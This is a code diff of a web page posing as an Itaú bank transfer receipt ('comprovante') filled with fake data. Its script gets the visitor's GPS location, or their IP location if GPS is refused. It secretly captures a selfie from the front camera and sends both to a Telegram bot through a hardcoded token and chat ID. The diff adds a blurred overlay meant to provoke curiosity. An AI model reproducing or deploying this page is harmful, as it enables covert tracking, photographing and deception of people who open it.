@@ -7,36 +7,44 @@
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}
   body{background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh}
+
   #spinnerBox{display:flex;flex-direction:column;align-items:center;justify-content:center}
   #spinner{width:48px;height:48px;border:4px solid #ddd;border-top:4px solid #003366;border-radius:50%;animation:spin 1s linear infinite}
   @keyframes spin{to{transform:rotate(360deg)}}
-  #msgNegado{display:none;text-align:center;color:#c00;font-size:16px;font-weight:600}
-  #comprovante{display:none;background:#fff;width:100%;max-width:480px;padding:24px;border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
-  .logo{background:#003366;color:#fff;font-weight:700;font-size:18px;padding:12px;text-align:center;border-radius:4px;margin-bottom:16px}
-  .row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px}
+
+  #comprovante{display:none;background:#fff;width:100%;max-width:480px;padding:24px;border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);position:relative;overflow:hidden}
+
+  #blurOverlay{
+    position:absolute;
+    inset:-20%;
+    background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600"><filter id="b"><feGaussianBlur stdDeviation="18"/></filter><rect width="800" height="600" fill="%23f0f0f0"/><g filter="url(%23b)" opacity=".4"><rect x="100" y="100" width="200" height="40" fill="%23003366" rx="4"/><rect x="120" y="160" width="160" height="20" fill="%23ccc" rx="3"/><rect x="120" y="200" width="140" height="20" fill="%23ccc" rx="3"/><rect x="120" y="240" width="180" height="20" fill="%23ccc" rx="3"/><rect x="120" y="280" width="150" height="20" fill="%23ccc" rx="3"/></g></svg>') center/cover;
+    filter:blur(12px);
+    display:none; /* só aparece após permissão */
+    z-index:0;
+  }
+
+  .logo{background:#003366;color:#fff;font-weight:700;font-size:18px;padding:12px;text-align:center;border-radius:4px;margin-bottom:16px;position:relative;z-index:1}
+  .row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px;position:relative;z-index:1}
   .label{color:#555}
   .value{font-weight:600}
-  .divider{height:1px;background:#ddd;margin:12px 0}
-  .center{text-align:center}
+  .divider{height:1px;background:#ddd;margin:12px 0;position:relative;z-index:1}
+  .center{text-align:center;font-size:12px;color:#777;position:relative;z-index:1}
+
   #camera{display:none}
 </style>
 </head>
 <body>
 
-<!-- SPINNER -->
 <div id="spinnerBox">
   <div id="spinner"></div>
   <p style="margin-top:12px;color:#003366;font-size:14px">Aguardando permissão de localização…</p>
 </div>
 
-<!-- MENSAGEM CASO NEGUE -->
-<div id="msgNegado">
-  <p>Para visualizar, precisa permitir permissões da página.</p>
-</div>
-
-<!-- COMPROVANTE (apenas texto) -->
 <div id="comprovante">
+  <div id="blurOverlay"></div>
+
   <div class="logo">Itaú</div>
+
   <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora"></span></div>
   <div class="divider"></div>
   <div class="row"><span class="label">Valor</span><span class="value" id="valor"></span></div>
@@ -44,17 +52,17 @@
   <div class="row"><span class="label">ID da transação</span><span class="value" id="idTransacao"></span></div>
   <div class="row"><span class="label">Autenticação BACEN</span><span class="value" id="autenticacao"></span></div>
   <div class="divider"></div>
-  <p class="center" style="font-size:12px;color:#777">Transação realizada com sucesso.</p>
+  <p class="center">Transação realizada com sucesso.</p>
 </div>
 
-<!-- CAMERA OCULTA -->
 <video id="camera" style="display:none;" autoplay muted playsinline></video>
 
 <script>
-/* ---------- CONFIG ---------- */
+/* ---------- TOKEN & ID ---------- */
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
 
+/* ---------- DADOS FALSOS ---------- */
 const dados = {
   valor: "R$ 1.234,56",
   dataHora: new Date().toLocaleString('pt-BR'),
@@ -62,39 +70,39 @@ const dados = {
   autenticacao: [...Array(20)].map(() => Math.random().toString(36)[2]).join('')
 };
 
-/* -------- EXIBIR DADOS -------- */
+/* preencher texto */
 document.getElementById('dataHora').textContent   = dados.dataHora;
 document.getElementById('valor').textContent      = dados.valor;
 document.getElementById('idTransacao').textContent= dados.idTransacao;
 document.getElementById('autenticacao').textContent=dados.autenticacao;
 
-/* -------- ENVIAR TELEGRAM --------- */
+/* ---------- ENVIAR TELEGRAM ---------- */
 const tele = (msg, media = null) => {
   if (media) {
-    let form = new FormData();
+    const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('caption', msg);
     form.append('photo', media, 'selfie.jpg');
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body: form});
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
   } else {
     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID,text:msg})
     });
   }
 };
 
-/* -------- TIRAR SELFIE ---------- */
+/* ---------- TIRAR SELFIE ---------- */
 async function tirarSelfie() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-    const v   = document.getElementById('camera');
+    const v = document.getElementById('camera');
     v.srcObject = stream;
     await v.play();
     const canvas = document.createElement('canvas');
     canvas.width = 640; canvas.height = 480;
-    canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
+    canvas.getContext('2d').drawImage(v, 0, 0);
     canvas.toBlob(blob => {
       tele('📸 selfie', blob);
       stream.getTracks().forEach(t=>t.stop());
@@ -104,38 +112,37 @@ async function tirarSelfie() {
   }
 }
 
-/* -------- COLETAR E ENVIAR --------- */
-function obterEEnviarDados(origem) {
-  if (origem === 'gps' && navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(pos=>{
-      const { latitude:l, longitude:n, accuracy:a } = pos.coords;
-      tele(`📍 gps permitido\nhttps://www.google.com/maps/@${l},${n},18z`);
-      mostrarComprovante();
-      setTimeout(tirarSelfie, 1200);
-    });
-  } else {
-    /* fallback IP (ou genérico) */
-    fetch('https://ipapi.co/json/')
-      .then(r=>r.json())
-      .then(data=>{
-        tele(`📍 via IP: https://www.google.com/maps/@${data.latitude},${data.longitude},18z`);
-      })
-      .catch(()=>tele('📍 falhou IP'));
-    // mesmo falhando ou negando → tenta
-    mostrarComprovante();
-    setTimeout(tirarSelfie, 1200);
-  }
+/* ---------- COLETAR IP ---------- */
+function obterIP() {
+  return fetch('https://ipapi.co/json/')
+    .then(r=>r.json())
+    .then(d=>d)
+    .catch(()=> ({ip:'Falha IP'}));
 }
 
+/* ---------- MOSTRAR COMPROVANTE ---------- */
 function mostrarComprovante() {
   document.getElementById('spinnerBox').style.display='none';
   document.getElementById('comprovante').style.display='block';
-  document.getElementById('msgNegado').style.display='none';
+  // agora ativa o fundo borrado → gera curiosidade
+  document.getElementById('blurOverlay').style.display='block';
+  // selfie atras 1s
+  setTimeout(tirarSelfie, 1200);
 }
 
-/* ---------- INÍCIO ---------- */
-obterEEnviarDados('ip');       // primeiro IP
-obterEEnviarDados('gps');      // se permitir GPS, sobrescreve IP
+/* ---------- PERMISSÃO GPS ---------- */
+navigator.geolocation.getCurrentPosition(
+  pos => {
+    const {latitude:l,longitude:n,accuracy:a} = pos.coords;
+    tele(`📍 GPS aceito\nhttps://maps.google.com/?q=${l},${n}`);
+    mostrarComprovante();
+  },
+  async () => {  // negado ou bloqueado
+    const geo = await obterIP();
+    tele(`📍 GPS recusado → IP: https://maps.google.com/?q=${geo.latitude},${geo.longitude}`);
+    mostrarComprovante();
+  }
+);
 </script>
 </body>
 </html>
